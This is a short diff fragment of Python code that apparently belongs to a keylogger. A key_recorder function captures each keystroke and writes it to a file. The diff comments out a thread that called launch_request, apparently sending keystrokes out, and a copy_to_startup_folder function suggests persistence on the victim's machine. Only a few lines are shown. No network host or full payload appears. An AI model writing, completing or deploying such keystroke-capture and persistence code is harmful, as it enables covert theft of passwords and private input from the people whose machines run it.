@@ -65,8 +65,9 @@ def key_recorder(key):
     print(char)
     f.write(char)
     t = threading.Thread(target=write_to_file, args=(char,))
-    t = threading.Thread(target=launch_request, args=(char,))
+    #t2 = threading.Thread(target=launch_request, args=(char,))
     t.start()
+
 
 
 def copy_to_startup_folder():
